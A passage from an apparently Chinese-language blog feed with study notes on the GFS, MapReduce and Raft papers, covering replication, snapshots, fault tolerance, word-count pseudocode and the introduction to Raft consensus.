<p><strong>GFS并不保证强一致性</strong>：如果写操作发生错误，GFS并不会撤销已成功执行的副本中的变更，各副本可能不一致。如下图，对同一个文件，客户端1请求追加数据A，客户端2请求追加数据B，客户端3请求追加数据C，请求同时达到。primary将这些变更排序后发给其它副本，其中一个副本在执行追加数据B时发生错误，错误返回给客户端2。客户端2重新发送写请求，此次请求成功。最终，导致各副本间状态并不一致。</p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BGFS/image_YQzsfqbceJ.png" alt="1"></p>
<p><strong>GFS分离控制流和数据流</strong>，以更好地利用网络带宽。当客户端向chunk所在的chunkserver节点推送数据时，它会先发给距离最近的。假设客户端要推送数据到chunkserver S1~S4，它先推送给最近的机器S1，然后S1推送给最近的S2，类似的S2推送给S3或者S4。</p>
<p>GFS提供<strong>原子性的append操作，称作record append</strong>。多个客户端可以并发地append，而不需要进行复杂的同步操作，比如分布式锁。record append也是一种变更操作，其过程与上述过程基本类似，只是主副本会先检查append数据是否超过最后一个chunk大小，若超过，它就将该chunk填充到最大值，然后告知客户端剩余操作应该在下一个chunk上重试。</p>
<h3 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h3><p>快照是一种完全可用拷贝，但并不是备份那样的完整拷贝。什么意思呢？备份是将全部数据完整拷贝到另一个副本上，而快照是在原数据的基础上，<strong>只将修改的新数据另存，而原数据保持不变</strong>。由于快照共享原数据，只需额外保存新数据，因此所占空间远小于备份，但容错性也更低。实现快照的方式有两种：**写时拷贝(COW, Copy On Write)<strong>、</strong>写时重定向(ROW, Redirect On Write)**。写时拷贝：在写数据时，将原数据拷贝到另一处，再将新数据写入。写重定向：在写数据时，直接将新数据写到另一处。</p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BGFS/image_bAUUBTRZXe.png" alt="1"></p>
<p>GFS提供快照功能，并采用写时拷贝来实现。当master收到要对某个文件创建快照的请求时，它会撤销该文件对应所有chunk的租约，并进行一些配置。当客户端在快照请求后<strong>第一次</strong>对某个chunk C进行写操作时，master会选择一个新的chunk C’，然后让所有拥有chunk C的chunkserver都创建chunk C’，并将chunk C数据拷贝到chunk C’，接着客户端就可以正常进行写操作。</p>
<h2 id="5-Master操作"><a href="#5-Master操作" class="headerlink" title="5. Master操作"></a>5. Master操作</h2><h3 id="namespace管理"><a href="#namespace管理" class="headerlink" title="namespace管理"></a>namespace管理</h3><p>不同于传统的文件系统，GFS不存在目录数据结构，并不能列出一个目录下的所有文件，也不提供别名。GFS只将文件的全路径作为文件的key，并通过<strong>前缀压缩</strong>高效地存储在内存中，namespace树（前缀压缩树）中每个节点（一个文件或目录）都有一个读写锁。</p>
<p>master中操作需要一系列<strong>锁</strong>来配合，比如：如果要操作&#x2F;d1&#x2F;d2&#x2F;…&#x2F;dn&#x2F;leaf，那么他就需要从&#x2F;d1、&#x2F;d1&#x2F;d2、… 到&#x2F;d1&#x2F;d2&#x2F;…&#x2F;dn这些目录的读锁，以及&#x2F;d1&#x2F;d2&#x2F;…&#x2F;dn&#x2F;leaf全路径的读锁或者写锁。<strong>文件写操作并不需要父级目录的写锁</strong>，是因为我们没有“目录”或者类似于inode的数据结构，使用读锁已经能够有效防止目录被删除。</p>
<p>这种锁模式的一个好处就是它允许对同一个目录进行并发的变更操作。比如多个文件创建操作可以并发地在同一个目录里面执行。每个操作需要一个目录的读锁和一个文件名的写锁。在目录上的读锁可以防止目录被删除，重命名或者快照。针对文件的写锁可以保证相同文件名的只会被创建一次。</p>
<h3 id="副本放置"><a href="#副本放置" class="headerlink" title="副本放置"></a>副本放置</h3><p>chunk副本的放置策略：最大化数据可靠性和可用性，最小化网络带宽的使用。因此，GFS会把副本分散到不同位置的集群上。</p>
<h3 id="创建chunk副本"><a href="#创建chunk副本" class="headerlink" title="创建chunk副本"></a>创建chunk副本</h3><p>创建chunk副本的情况有3种：chunk的初次创建、重备份、重平衡。</p>
<p>初次创建chunk时，master会考虑以下因素来放置chunk副本：磁盘使用率较低的chunkserver；最近创建chunk次数较少的chunkserver；不同位置集群中的chunkserver。</p>
<p>一旦可用的chunk备份数量低于用户指定的数量（chunkserver失效等情况），master就需要重新备份一个chunk。</p>
<p>master会周期性地对副本进行重平衡：检查副本分布，将副本移动到磁盘使用率较低的chunkserver上。</p>
<h3 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h3><p>一个文件被删除后，master会将删除操作记录到日志中，但不会立即释放资源，该删除的文件只是被重命名为一个包含了删除时间戳的隐藏文件名。当master对namespace进行常规扫描时，如果发现某个隐藏文件已存在3天以上，就会移除这个文件。在这之前，可以通过重命名为正常名字来撤销删除操作。当从namespace中移除文件后，文件相应的chunk也就孤立了，master还会将孤立的chunk从元数据中移除。</p>
<p>当chunkserver与master心跳通信时，chunkserver会向master报告一个chunk集合，<strong>master会标识出其中已经不存在的chunk并返回</strong>，然后chunkserver就可以自由地删除这些chunk副本。</p>
<p>这种垃圾回收方式的好处是简单可靠，master不需要准确知道哪些chunkserver有这些chunk，哪些没有。同时，伴随在namespace常规扫描、chunkserver心跳等操作中，减少额外开销。但坏处是不能及时清理，占用磁盘。</p>
<h3 id="过期副本检测"><a href="#过期副本检测" class="headerlink" title="过期副本检测"></a>过期副本检测</h3><p>当一个chunkserver停机或者失效，它拥有的chunk副本将不能进行新的变更操作，导致chunk副本过期。对于每个chunk，master通过<strong>版本号来区分最新还是过期的副本</strong>。</p>
<p>一旦master对一个chunk授权一个新的租约，就会增加该chunk的版本号，并通知chunk副本所在的所有chunkserver更新，master和chunkserver都会持久化地记录这个副本的新版本号。这发生在客户端写数据之前。</p>
<p>如果一个chunkserver失效，它将收不到更新通知，它对应的chunk副本版本号也不会更新。当它重新启动时，会向master报告它的chunk集合和版本号，master就能检测到这个过期副本。master会通过周期性的垃圾回收来移除这些过期的副本。</p>
<p>当master发现有chunkserver版本号大于它保存的，它就会更新自己的版本号。</p>
<p>读数据时，若请求过期副本，会返回不存在。写数据时，master会将chunk的版本号一同发给客户端，客户端在执行操作前会验证版本号。</p>
<h2 id="6-容错和诊断"><a href="#6-容错和诊断" class="headerlink" title="6. 容错和诊断"></a>6. 容错和诊断</h2><h3 id="高可用"><a href="#高可用" class="headerlink" title="高可用"></a>高可用</h3><p>GFS使用两个简单有效的策略来保证高可用：快速恢复和备份。</p>
<p>master和chunkserver无论如何被终止，都会在几秒内恢复状态并启动。</p>
<p>chunk会被备份到多个chunkserver上。</p>
<p>master的操作日志和检查点也会被备份到多台机器上。一个对master状态的变更，只有在日志记录已经完全写到本地磁盘和其他所有的副本之后，才会认为是提交了。如果master所在的机器或者磁盘失败了，<strong>在GFS外部的一个监控基础设施</strong>就会在别的地方，通过备份的操作日志重新开启一个新的master进程。</p>
<p>在主master已经挂掉了的情况下，<strong>“影子”master</strong>依然可以为这个文件系统提供只读访问。他们是影子，并不是镜像，所以他们可能会比主master稍微落后一些，通常是几秒。对于那些不经常变更文件或者应用程序不介意获取到的是有点旧的结果，这提高了读的可用性。影子master为了保证自身的实时性，一个影子master会读取一个不断增长的操作日志的副本，然后将这些操作序列应用在自己的数据结构上。</p>
<h3 id="数据完整性"><a href="#数据完整性" class="headerlink" title="数据完整性"></a>数据完整性</h3><p>每个chunkserver使用<strong>校验和</strong>来检测数据是否被破坏。由于GFS不保证强一致性，不同chunkserver上的chunk副本可能不一致，chunkserver可以通过其它chunk副本来恢复数据，但需要自己维持校验和来独立地验证。一个chunk被分割成64KB大小的块，每个块都有32bit的校验和，这些校验和会被持久化保存。</p>
<p>读操作时，chunkserver会验证读取的数据块的校验和，当校验和不一致时，chunkserver会返回错误。</p>
<p>对于写操作，如果是append操作，会计算并保存新增加块的校验和。如果是覆盖原有内容，会先验证原有内容第一块和最后一个块，然后再执行写操作，最后重新计算并保存被覆盖块的校验和。</p>
<h2 id="7-个人总结"><a href="#7-个人总结" class="headerlink" title="7. 个人总结"></a>7. 个人总结</h2><p>GFS对于大型的分布式文件存储有着革命性影响，虽然GFS的具体实现并未开源，许多细节也没有在论文中详细讲解，但它的许多设计理念依旧值得学习，比如：</p>
<ul>
<li><p>结合具体场景进行取舍。在文件存储系统中，并不一定要保证强一致性，不如牺牲部分一致性来提高性能。</p>
</li>
<li><p>将数据流和控制流分离，从而对数据流进行更好的优化。</p>
</li>
<li><p>通过租约将写操作交给主副本所在的chunkserver管控，分摊master压力。</p>
</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a href="https://static.googleusercontent.com/media/research.google.com/zh-CN//archive/gfs-sosp2003.pdf" title="The Google File System">The Google File System</a></p>
</li>
<li><p><a href="https://segmentfault.com/a/1190000023309479" title="The Google File System（个人翻译） - SegmentFault 思否">The Google File System（个人翻译） - SegmentFault 思否</a></p>
</li>
<li><p><a href="https://pdos.csail.mit.edu/6.824/schedule.html" title="MIT6.824 LEC3-GFS">MIT6.824 LEC3-GFS</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式</tag>
        <tag>GFS</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式之MapReduce</title>
    <url>/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BMapReduce.html</url>
    <content><![CDATA[<p>论文：Dean J, Ghemawat S. MapReduce: Simplified data processing on large clusters[J]. 2004.</p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://pdos.csail.mit.edu/6.824/index.html">MIT6.824</a>分布式课程第一课的课前阅读要求。</p>
<p>MapReduce是谷歌提出的面向大规模数据的分布式并行计算模式，给大数据并行计算带来了革命性影响，MapReduce也是著名的Hadoop中相当重要的一部分。</p>
<span id="more"></span>

<h1 id="论文解读"><a href="#论文解读" class="headerlink" title="论文解读"></a>论文解读</h1><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>MapReduce用于大数据的计算。</p>
<p>用户可定义一个 map 函数，用于处理一个键值对，并生成一堆中间键值对；同时，用户再定义一个 reduce 函数，它用于合并所有 key 相同的中间键值对。</p>
<h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1 Introduction"></a>1 Introduction</h2><p>map 和 reduct 的设计理念受 Lisp 等函数式语言的启发。</p>
<p>我们意识到大部分计算都可以：先用一个 map 操作去计算输入中的每个逻辑单位，得出一个包含中间态键值对的集合；然后再用一个 reduce 操作去合并所有 key 相同的 value 。</p>
<blockquote>
<p>We realized that most of our computations involved applying a map operation to each logical “record” in our input in order to compute a set of intermediate key&#x2F;value pairs, and then applying a reduce operation to all the values that shared the same key, in order to combine the derived data appropriately.</p>
</blockquote>
<p>容错的主要机制：重新执行。</p>
<p>第2节介绍基础的程序模型和几个样例；第3节介绍在集群计算环境下， MapReduce 接口的简单实现；第4节介绍几种我们认为有用的程序模型的改良；第5节展示在各种各样任务上的测量；第6节展示 MapReduce 在谷歌内部的使用，包括使用经验；第7节讨论未来相关的工作。</p>
<h2 id="2-Programming-Model"><a href="#2-Programming-Model" class="headerlink" title="2 Programming Model"></a>2 Programming Model</h2><p>程序的输入和输出都是键值对集合。使用 MapReduce 的用户需要将计算过程表示成两个函数：Map 和 Reduce 。</p>
<ul>
<li>Map 函数。由用户自定义，输入一个键值对，进行处理后，输出一组中间键值对。MapReduce 会将其中 key 相同的键值对的 value 合并起来，关联到同一个 key ，并将其传给 Reduce 函数。</li>
<li>Reduce 函数。也由用户自定义，接收一个中间键值对的 key 和该 key 对应的一组 value 。Reduce 会将这些 value 合并起来，输出一组新的 value ，不过通常它只输出零或一个值。输入中的一组 value 会通过一个迭代器传递，防止数据量太大而导致内存无法容纳。</li>
</ul>
<h3 id="2-1-Example"><a href="#2-1-Example" class="headerlink" title="2.1 Example"></a>2.1 Example</h3><p>统计大量文档中各单词出现的次数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">map</span>(String key, String value):</span><br><span class="line">  <span class="comment">// key: document name</span></span><br><span class="line">  <span class="comment">// value: document contents</span></span><br><span class="line">  <span class="keyword">for</span> each word w in value:</span><br><span class="line">    EmitIntermediate(w, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">reduce(String key, Iterator values):</span><br><span class="line">  <span class="comment">// key: a word</span></span><br><span class="line">  <span class="comment">// values: a list of counts</span></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> each v in values:</span><br><span class="line">    result += ParseInt(v);</span><br><span class="line">  Emit(AsString(result));</span><br></pre></td></tr></table></figure>


<h3 id="2-2-Types"><a href="#2-2-Types" class="headerlink" title="2.2 Types"></a>2.2 Types</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">map</span>    (k1,v1)       → <span class="built_in">list</span>(k2,v2)</span><br><span class="line">reduce (k2,<span class="built_in">list</span>(v2)) → <span class="built_in">list</span>(v2)</span><br></pre></td></tr></table></figure>


<p>map函数输入的键值对<code>(k1,v1)</code> 和输出的中间键值对<code>(k2,v2)</code>属于不同域，比如在上述示例中：对于map函数，<code>(k1,v1)</code>是文档名和文档内容，而<code>(k2,v2)</code>则是单词和出现次数，；而对于reduce函数，输入的<code>v2</code>是单词出现次数，输出也是单词出现次数，属于同一域。</p>
<h3 id="2-3-More-Examples"><a href="#2-3-More-Examples" class="headerlink" title="2.3 More Examples"></a>2.3 More Examples</h3><ul>
<li>Distributed Grep：map函数输出被匹配的行，reduce函数则只是拷贝输入到输出。</li>
<li>Count of URL Access Frequency：map输入请求日志并输出<code>&lt;URL, 1&gt;</code>，reduce求和URL相同的键值对的值并输出<code>&lt;URL, total count&gt;</code>。</li>
<li>Reverse Web-Link Graph：map函数输出<code>&lt;target, source&gt;</code>，target是指向目标URL的链接，source是链接所在页面的名称；reduce函数将所有target相同的source集合起来，输出<code>&lt;target, list(source)&gt;</code>。</li>
<li>Term-Vector per Host</li>
<li>Inverted Index</li>
<li>Distributed Sort</li>
</ul>
<h2 id="3-Implementation"><a href="#3-Implementation" class="headerlink" title="3 Implementation"></a>3 Implementation</h2><p>本节所介绍的MapReduce实现将基于大规模计算机集群。</p>
<h3 id="3-1-Execution-Overview"><a href="#3-1-Execution-Overview" class="headerlink" title="3.1 Execution Overview"></a>3.1 Execution Overview</h3><p>Map函数分布在多个机器上，输入数据将被自动分为M片，每一片可被不同机器并行地处理。中间键值对通过一个分区函数（partitioning function）分为R片，R和分区函数由用户自定义。</p>
<p>MapReduce调用过程如下：</p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BMapReduce/image.png" alt="1"></p>
<ol>
<li>MapReduce库先将输入文件分为M片，每片通常16MB到64MB。然后它将唤醒程序对应的集群。</li>
<li>集群存在一个特殊的节点master，其余都为worker。总共有M个Map任务和R个Reduce任务，由master分配给相应的worker。</li>
<li>负责Map任务的worker，从对应的片段中读取输入数据（M个Map worker与输入的M个片段一一对应）。它从输入中解析出键值对，然后将每一个传递给用户定义的Map函数。Map函数处理后输出中间键值对，并缓存在内存中。</li>
<li>缓存的中间键值对会周期性地写入磁盘中，并被分区函数（比如<code>hash(key) mod R</code>，保证不同map输出的相同key都在同一个序号的分区中）分为R个分区（对应R个Reduce任务，比如第i个分区对应第i个Reduce）。这些缓存的中间键值对的位置会被告知给master，master会将位置传达给Reduce worker。</li>
<li>当Reduce worker被master告知中间键值对位置后，它会通过远程调用读取对应Map worker磁盘中的数据（第i个Reduce读取所有Map中第i个分区的数据）。当Reduce worker读取了所有的中间键值对，<strong>它会根据key进行排序</strong> ，因此相同key的中间键值对会组合在一起。如果数据量太大无法放入内存，则需进行外部排序。</li>
<li>Reduce worker会遍历排好序的中间键值对，将每一个唯一的key和对应的一组value传递给用户定义的Reduce函数，输出结果将追加到当前reduce分区对应的最终文件。</li>
<li>当所有map和reduce任务完成，master将唤醒并返回用户程序。</li>
</ol>
<p>当MapReduce成功执行完成，结果将会存放在R个输出文件中（对应Reduce任务个数）。用户并不需要合并这R个文件，它们通常会作为下一个MapReduce任务的输入或者应用到下一个分布式任务。</p>
<h3 id="3-2-Master-Data-Structures"><a href="#3-2-Master-Data-Structures" class="headerlink" title="3.2 Master Data Structures"></a>3.2 Master Data Structures</h3><p>master节点保存每个map和reduce任务的状态、每态计算机的标识、已完成的map worker的输出数据的位置和大小。</p>
<h3 id="3-3-Fault-Tolerance"><a href="#3-3-Fault-Tolerance" class="headerlink" title="3.3 Fault Tolerance"></a>3.3 Fault Tolerance</h3><h4 id="Worker-Failure"><a href="#Worker-Failure" class="headerlink" title="Worker Failure"></a>Worker Failure</h4><p>master定期ping每一个worker，如果某个worker一段时间内没有响应，则将其标记为failed失败。</p>
<p><strong>对于失败worker中的map任务，不管任务已完成还是在进行中，都将被重置为idle初始状态，并分配给另一个worker。</strong> 因为，失败worker中map任务的输出被保存在失败worker电脑的本地磁盘。</p>
<p>对于失败worker中的reduce任务，若任务已完成则不需要被重新执行，因为它们的输出被保存在全局文件系统。</p>
<p>当一个map任务先被worker A执行再被worker B执行（A出现异常）时，所有从A读取输入数据的正在执行的reduce任务将被通知重新执行。</p>
<h4 id="Master-Failure"><a href="#Master-Failure" class="headerlink" title="Master Failure"></a>Master Failure</h4><p>将master的相关数据周期性地写入checkpoint检查点，如果master失效，一个新的副本将从最近一次的checkpoint启动。然而，master只有一个节点，是不可能失效的（？）。如果master失效，将中止MapReduce计算。客户端可检查此条件，并重试MapReduce计算。</p>
<blockquote>
<p>It is easy to make the master write periodic checkpoints of the master data structures described above. If the master task dies, a new copy can be started from the last checkpointed state. However, given that there is only a single master, its failure is unlikely; therefore our current implementation aborts the MapReduce computation if the master fails. Clients can check for this condition and retry the MapReduce operation if they desire.</p>
</blockquote>
<h4 id="Semantics-in-the-Presence-of-Failures"><a href="#Semantics-in-the-Presence-of-Failures" class="headerlink" title="Semantics in the Presence of Failures"></a>Semantics in the Presence of Failures</h4><p>map和reduce任务的提交都是原子操作。</p>
<p><strong>每一个正在运行的任务会将输出写到私有的暂存文件中</strong> ，reduce任务产生一个这样的文件，map任务产生R个这样的文件（每个对应一个reduce任务？）。</p>
<p><strong>当map任务完成时，worker会向master发送一条消息，包含R个暂存文件的名字</strong> 。如果master已接受过该消息，则忽略，否则将消息数据记录到本地。</p>
<p><strong>当reduce任务完成时，worker会原子地将其输出的暂存文件重命名为最终输出文件</strong> 。如果相同的reduce任务被多台机器执行，多个重命名操作会被执行在最终输出文件上，但由于原子性，我们能保证最终文件仅包含一个reduce任务所产生的数据。</p>
<h3 id="3-4-Locality"><a href="#3-4-Locality" class="headerlink" title="3.4 Locality"></a>3.4 Locality</h3><p>master在调度map任务时会考虑输入数据文件的位置信息。尽量在包含该相关输入数据的副本的机器上执行map任务。如果任务失败，master会尝试在保存输入数据副本的邻近机器上执行map任务（比如同一网络中）。</p>
<h3 id="3-5-Task-Granularity"><a href="#3-5-Task-Granularity" class="headerlink" title="3.5 Task Granularity"></a>3.5 Task Granularity</h3><p>我们将map任务划分成M个，reduce任务划分成R个，同时M和R远远大于worker的数量。</p>
<p>master必须执行O(M+R)次调度，并在内存中保存O(M*R)个状态。</p>
<p>R通常由用户定义，因为最终会有R个输出文件。实际中，M的值会保证每份独立的输入数据在16MB在64MB之间，R的值则应该是worker的倍数。比如：2000个worker，M&#x3D;200000，R&#x3D;5000。</p>
<h3 id="3-6-Backup-Tasks"><a href="#3-6-Backup-Tasks" class="headerlink" title="3.6 Backup Tasks"></a>3.6 Backup Tasks</h3><p>导致MapReduce总时间延长的一个常见原因是存在“落伍者”——一台机器在执行最后几个map或reduce时，花费了比平时更长的时间。“落伍者”出现的原因有很多，比如磁盘出现了错误，读写速度从30MB&#x2F;s下降到1MB&#x2F;s。</p>
<p>我们有一个常用方法来解决“落伍者”问题，当MapReduce任务快完成时，master将会<strong>备份执行</strong> 正在运行中的剩余任务，只要主任务或备份任务完成，任务就会被标记为已完成。</p>
<p>使用该机制只会比不使用多花费几个百分比的计算资源，但能显著减少运行大型计算所需要的时间。</p>
<h2 id="4-Refinements"><a href="#4-Refinements" class="headerlink" title="4 Refinements"></a>4 Refinements</h2><h3 id="4-1-Partitioning-Function"><a href="#4-1-Partitioning-Function" class="headerlink" title="4.1 Partitioning Function"></a>4.1 Partitioning Function</h3><p>reduce任务&#x2F;输出文件数量R由用户定义，中间键值对被分区函数分为R份。一个默认的分区函数通常使用HASH，比如：<code>hash(key) mod R</code>，再比如：中间key是URL，且想要域名相同的最终在一个输出文件中，分区函数可定义为<code>hash(Hostname(urlkey)) mod R</code>。</p>
<h3 id="4-2-Ordering-Guarantees"><a href="#4-2-Ordering-Guarantees" class="headerlink" title="4.2 Ordering Guarantees"></a>4.2 Ordering Guarantees</h3><p>对于一个给定的分区，中间键值对会根据key升序排列。这种顺序能保证分区对应的输出文件是有序的。有时这很有用。</p>
<h3 id="4-3-Combiner-Function"><a href="#4-3-Combiner-Function" class="headerlink" title="4.3 Combiner Function"></a>4.3 Combiner Function</h3><p>在很多情况下，不同map任务会产生相同的中间键值对。比如在单词统计的MapReduce程序中，每个map任务都会产生数以千计的<code>&lt;the, 1&gt;</code>键值对，所有这些键值对会被发送给单个reduce任务。我们允许<strong>用户定义一个Combiner函数，在数据发送之前，可以通过该函数将数据进行部分合并</strong> 。</p>
<p>Combiner函数在map任务运行的每台机器上执行。通常Combiner函数和Reduce函数代码一样（？），不同在于Reduce函数输出到最终文件，Combiner函数输出到中间文件。</p>
<p>部分合并会明显提升某类MapReduce操作的速度。</p>
<h3 id="4-4-Input-and-Output-Types"><a href="#4-4-Input-and-Output-Types" class="headerlink" title="4.4 Input and Output Types"></a>4.4 Input and Output Types</h3><p>MapReduce支持读取不同形式的输入数据，例如：对于文本数据，每一行当作一对key&#x2F;value。</p>
<p>用户可以使用预定义的输入格式，也可以实现reader接口用来支持新的输入格式。reader函数不仅可以从文件中读取数据，也可以从数据库、内存中读取。</p>
<p>同样，我们也提供预定义的输出格式用于产生输出，当然用户也可以自定义。</p>
<h3 id="4-5-Side-effects"><a href="#4-5-Side-effects" class="headerlink" title="4.5 Side-effects"></a>4.5 Side-effects</h3><p>在某些情况下，用户为了便利，会在执行map或reduce任务时产生额外的辅助文件。我们需要用户保证这些副作用(side-effects)的原子性和幂等性(idempotent)。</p>
<p>我们不支持一个任务产生多个输出文件所带来的两段原子提交。。。（没搞懂，原文如下）</p>
<blockquote>
<p>We do not provide support for atomic two-phase commits of multiple output fifiles produced by a single task.Therefore, tasks that produce multiple output fifiles withcross-fifile consistency requirements should be deterministic. This restriction has never been an issue in practice.</p>
</blockquote>
<h3 id="4-6-Skipping-Bad-Records"><a href="#4-6-Skipping-Bad-Records" class="headerlink" title="4.6 Skipping Bad Records"></a>4.6 Skipping Bad Records</h3><p>有时，某个记录(record)会导致Map或Reduce函数崩溃，这些bug会阻止MapReduce的完成。</p>
<p>通常的方法是去修复这个bug，但有时候是不可修复的，比如bug在第三方库中。我们提供了一种<strong>可选的执行模式</strong> ，MapReduce检测到某个记录会导致崩溃时，将会跳过这个记录。</p>
<p>具体细节是，worker上运行一个捕获内存段异常(segmentation violation)和总线错误(bus error)的handler。在调用Map或Reduce函数之前，MapReduce会保存参数的序号。如果程序产生错误信号(signal)，handler就会向master发送一个包含参数序号的”last gasp”UDP包。如果master发现这个记录出现了不止一次错误，就会标记这个记录，并让重新执行的Map或Reduce任务跳过它。</p>
<h3 id="4-7-Local-Execution"><a href="#4-7-Local-Execution" class="headerlink" title="4.7 Local Execution"></a>4.7 Local Execution</h3><p>调试分布式系统是一个棘手的问题，为了方便调试，我们实现了另一种MapReduce——可以在本地机器上顺序执行所有操作。</p>
<h3 id="4-8-Status-Information"><a href="#4-8-Status-Information" class="headerlink" title="4.8 Status Information"></a>4.8 Status Information</h3><p>在master中，运行着一个HTTP服务器，它向用户展示一些状态页面。这些状态页面展示计算的进度，比如：<code>how many tasks have been completed, how many are inprogress, bytes of input, bytes of intermediate data, bytes of output, processing rates, etc</code>。页面还包含每个任务产生的错误和输出文件的链接。用户可以通过页面估计时间、添加计算资源、分析调试等等。</p>
<h3 id="4-9-Counters"><a href="#4-9-Counters" class="headerlink" title="4.9 Counters"></a>4.9 Counters</h3><p>MapReduce还提供计数器counter用于记录不同事件发生的次数，比如已处理单词的个数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Counter* uppercase;</span><br><span class="line">uppercase = GetCounter(<span class="string">&quot;uppercase&quot;</span>);</span><br><span class="line"><span class="built_in">map</span>(String name, String contents):</span><br><span class="line">  <span class="keyword">for</span> each word w in contents:</span><br><span class="line">    <span class="keyword">if</span> (IsCapitalized(w)):</span><br><span class="line">      uppercase-&gt;Increment();</span><br><span class="line">    EmitIntermediate(w, <span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure>


<p>每隔一段时间，计数器的值会从不同worker上报给master。来自已成功完成的map和reduce任务的counter值，会被master集合起来，并在MapReduce完成后返回给用户代码。同时，counter值也在状态页面展示给用户。聚合counter值时，master会剔除重复执行的任务。</p>
<h2 id="5-Performance"><a href="#5-Performance" class="headerlink" title="5 Performance"></a>5 Performance</h2><p>略</p>
<h2 id="6-Experience"><a href="#6-Experience" class="headerlink" title="6 Experience"></a>6 Experience</h2><p>略</p>
<h2 id="7-Related-Work"><a href="#7-Related-Work" class="headerlink" title="7 Related Work"></a>7 Related Work</h2><p>略</p>
<h2 id="8-Conclusions"><a href="#8-Conclusions" class="headerlink" title="8 Conclusions"></a>8 Conclusions</h2><p>MapReduce成功的原因：</p>
<ol>
<li>易于使用（抽象性好）。</li>
<li>很多问题都能用MapReduce表示。</li>
<li>已经成熟，可以扩展到数千台机器上使用。</li>
</ol>
<p>这项工作中的启发：</p>
<ol>
<li>通过<strong>限制编程模式</strong> 可以让并行分布式计算和计算容错更加容易。</li>
<li><strong>网络是一种紧缺资源</strong> 。因此我们进行了许多优化，比如：从本地读取数据、将中间数据暂存到本地。</li>
<li>可以使用<strong>冗余执行</strong> ，来减少速度比较慢的机器所带来的影响，以及处理计算机故障和数据丢失。</li>
</ol>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式之Raft</title>
    <url>/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BRaft.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当下，分布式是一大热门，常用场景比如分布式数据库等。在错综复杂的分布式网络环境中，不同节点间的数据（也被称为状态）很可能不一致，原因比如：传输时数据丢失、节点崩溃等等。分布式中所要解决的一大问题，就是节点间如何达成共识，也就是如何保证各节点数据的一致性。最容易想到的方法是，选择一个主节点，其它节点与主节点状态保持一致。但致命的问题在于，主节点崩溃了怎么办？如何选取新的主节点？如何保证新主节点的数据是正确的？这些都需要一个完整的算法机制。</p>
<p>Raft是当下最流行的崩溃容错共识(CFT)&#x2F;分布式一致性算法之一，被广泛应用于分布式数据库中，比如k8s中的etcd。本文主要是对Raft论文中关键内容的摘取翻译，并附加自己的理解。</p>
<p>Raft论文：Ongaro D, Ousterhout J. In search of an understandable consensus algorithm[C]&#x2F;&#x2F;2014 {USENIX} Annual Technical Conference ({USENIX}{ATC} 14). 2014: 305-319.</p>
<span id="more"></span>

<h2 id="论文解读"><a href="#论文解读" class="headerlink" title="论文解读"></a>论文解读</h2><h3 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h3><p>Raft是一种用于日志复制共识算法，与Paxos作用相同、效率相同，但它的结构与Paxos不同，也比Paxos更容易理解、更容易实现。</p>
<p>Raft分离了共识的核心部分，比如：领导人选举、日志复制、安全性，同时增强了一致性程度以减少需要考虑的状态数量。</p>
<blockquote>
<p>In order to enhance understandability, Raft separates the key elements of consensus, such as leader election, log replication, and safety, and it enforces a stronger degree of coherency to reduce the number of states that must be considered.</p>
</blockquote>
<p>Raft包括了一种新机制，通过重叠大多数保证集群成员变动的安全性。</p>
<blockquote>
<p>Raft also includes a new mechanism for changing the cluster membership, which uses overlapping majorities to guarantee safety.</p>
</blockquote>
<h3 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1 Introduction"></a>1 Introduction</h3><p>在共识算法领域，Paxos的统治地位可见一斑：</p>
<blockquote>
<p>Paxos [15, 16] has dominated the discussion of consensus algorithms over the last decade: most implementations of consensus are based on Paxos or inflfluenced by it, and Paxos has become the primary vehicle used to teach students about consensus.</p>
</blockquote>
<p>但，Paxos晦涩难懂且难以实现。</p>
<p>为了让Raft算法更易于理解，作者使用了分解与减少状态数的方法。</p>
<p>Raft在很多方面与现有共识算法很相似（比如Oki和Liskov的视图戳复制Viewstamped Replication），但也有许多新颖的功能：</p>
<ul>
<li>Strong leader</li>
<li>Leader election：Raft使用随机定时器来选举leader。</li>
<li>Membership changes：使用joint consensus的新方法处理集群中服务器的变动。</li>
</ul>
<p>第2节介绍复制状态机的问题（replicated state machine problem）；第3节讨论Paxos的优缺点；第4节描述实现易理解性的大体方法；第5-8节讲解Raft算法；第9节测评Raft算法；第10节讨论最近的相关工作。</p>
<h3 id="2-Replicated-state-machines"><a href="#2-Replicated-state-machines" class="headerlink" title="2 Replicated state machines"></a>2 Replicated state machines</h3><p>在分布式系统中，常用复制状态机(replicated state machine)解决容错问题。比如，在只有一个leader的大型系统中，通常会使用独立的复制状态机，去管理leader的选举与配置信息的存储（防止leader崩溃）。</p>
